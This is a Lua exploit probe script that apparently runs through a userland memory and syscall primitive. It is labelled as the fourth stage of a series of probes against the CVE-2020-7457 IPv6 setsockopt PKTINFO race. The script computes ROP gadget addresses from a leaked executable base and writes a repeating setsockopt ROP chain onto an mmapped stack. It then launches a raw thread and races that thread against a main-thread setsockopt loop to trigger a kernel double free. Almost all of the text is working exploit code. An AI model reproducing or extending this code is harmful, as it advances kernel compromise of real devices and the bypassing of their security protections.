-- CRASH_CLASS: HIGH
-- PROBE 91d: IPv6 setsockopt race — full RDX-reset child loop
--
-- 91c found pop rdx;ret at +0x3B02D7 in eboot.
-- 91b confirmed RDX clobbered after setsockopt.
-- This: real CVE-2020-7457 race — child loops [PRDX][46][PRAX][105][SA]
-- while main loops setsockopt(PKTINFO). Double free if unpatched.

print("=== PROBE 91d: IPv6 SETSOCKOPT RACE (FULL) ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477); local c624=mk(624)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local ebase=uint64(string.format("0x%X%08X",ehi,elo))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))
print("PRDX="..q(PRDX))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R8=0x068;local _R10=0x090;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end
local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
-- SETUP
-- ============================================================
print("--- SETUP ---")

local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("socket(AF_INET6,DGRAM)="..s6)
if s6<=0 then print("IPv6 BLOCKED") return end

local PV6=41; local PKTINFO=46

-- Baseline: addr[0]=77
local pi0=memory.alloc(20); z(pi0,20); wd(pi0,77)
local br=N(native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi0),20))
print("baseline rv="..br)

local function get_marker()
    local gb=memory.alloc(32); z(gb,32)
    local gl=memory.alloc(4); wd(gl,20)
    local rv=N(native.fcall_with_rax(stub,118,s6,PV6,PKTINFO,N(gb),N(gl)))
    if rv~=0 then return nil end
    return rd(gb)
end

local mk0=get_marker()
print("marker="..tostring(mk0))

-- ============================================================
-- BUILD CHILD ROP CHAIN
-- ============================================================
print("")
print("--- CHILD ROP ---")

local STSZ=0x40000
local ok_s,stk=pcall(function()
    return mm(uint64(0),uint64(STSZ),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_s then print("FAIL mmap") return end

-- Child pktinfo: addr[0]=2, ifindex=0
local pi_c=memory.alloc(20); z(pi_c,20); wd(pi_c,2)

-- Chain: [PRDX][46][PRAX][105][SA] × ncycles + nanosleep tail
local off=0
local ncycles=math.floor((STSZ-200)/40)
for i=1,ncycles do
    wq(stk+off,PRDX); off=off+8
    wq(stk+off,uint64(PKTINFO)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(105)); off=off+8
    wq(stk+off,SA); off=off+8
end

-- Nanosleep tail
local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(N(ts))); off=off+8
wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
wq(stk+off,SA); off=off+8
print(ncycles.." child setsockopt cycles built")

-- ============================================================
-- LAUNCH CHILD
-- ============================================================
print("")
print("--- RACE ---")

local ctx=memory.alloc(0x200); z(ctx,0x200)
wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
wq(ctx+_TP,uint64(0x10000))
wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
wq(ctx+_IP,SA); wq(ctx+_SP,uint64(N(stk)))
wq(ctx+_AX,uint64(105))
wq(ctx+_DI,uint64(s6))
wq(ctx+_SI,uint64(PV6))
wq(ctx+_DX,uint64(PKTINFO))
wq(ctx+_R10,uint64(N(pi_c)))
wq(ctx+_R8,uint64(20))

local vm0=vmc()
local tb=memory.alloc(8); wq(tb,uint64(0))
local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
local tid=rq(tb)
print("thr_create rv="..(ok_t and tostring(N(rv_t)) or "X").." tid="..q(tid))

-- Main thread: tight setsockopt(PKTINFO) loop
-- addr[0]=1 for main, addr[0]=2 for child
local pi_m=memory.alloc(20); z(pi_m,20); wd(pi_m,1)
local m_ok,m_fail=0,0
for i=1,5000 do
    local rv=N(native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi_m),20))
    if rv==0 then m_ok=m_ok+1 else m_fail=m_fail+1 end
end

local vm1=vmc()
local mk_after=get_marker()
print("main: ok="..m_ok.." fail="..m_fail)
print("VM: "..vm0.." -> "..vm1.." d="..(vm1-vm0))
print("child alive="..tostring(alive(tid)))
print("marker="..tostring(mk_after).." (1=main last, 2=child last)")

-- ============================================================
-- RESULTS
-- ============================================================
print("")
print("--- RESULT ---")
if mk_after==2 then
    print("child DID set PKTINFO (marker=2) — RDX reset works!")
    print("both threads racing setsockopt(PKTINFO) concurrently")
elseif mk_after==1 then
    print("main was last (marker=1) — child may have raced too")
elseif mk_after==77 then
    print("marker=77 (baseline unchanged) — neither thread set PKTINFO?!")
else
    print("marker="..tostring(mk_after).." (unexpected)")
end

local total=m_ok+ncycles
print("survived "..total.." concurrent setsockopt(PKTINFO)")
print("no kernel panic = ip6_setpktopt race PATCHED or window too tight")

-- ============================================================
-- CLEANUP
-- ============================================================
print("")
native.fcall_with_rax(stub,6,s6)
if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91d DONE ===")
